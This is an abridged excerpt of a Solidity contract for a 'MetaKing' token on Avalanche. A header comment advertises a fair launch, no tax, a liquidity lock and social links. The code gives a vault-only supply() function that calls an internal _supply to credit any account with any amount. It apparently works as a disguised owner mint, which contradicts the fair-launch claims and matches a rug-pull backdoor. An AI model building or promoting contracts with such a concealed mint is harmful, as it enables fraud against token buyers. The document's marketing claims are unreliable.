...
/**
  ...
  avalanche network fairlaunch

  Socials:

  telegram: https://t.me/AVAMetaKing
  website: https://avametaking.com/
  twitter: https://twitter.com/MetaKingAva

  Liquidity lock one month
  No tax
  Join the metaverse
...
abstract contract ERC20 is IERC20 {
  ...
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    ...
    function _supply(address account_, uint256 amount_) internal virtual {
...
contract MetaKing  is ERC20Permit, VaultOwned {

    using SafeMath for uint256;

    constructor() ERC20("MetaKing", "MetaKing", 9) {
    }

    function supply(address account_, uint256 amount_) external onlyVault() {
        _supply(account_, amount_);
    }
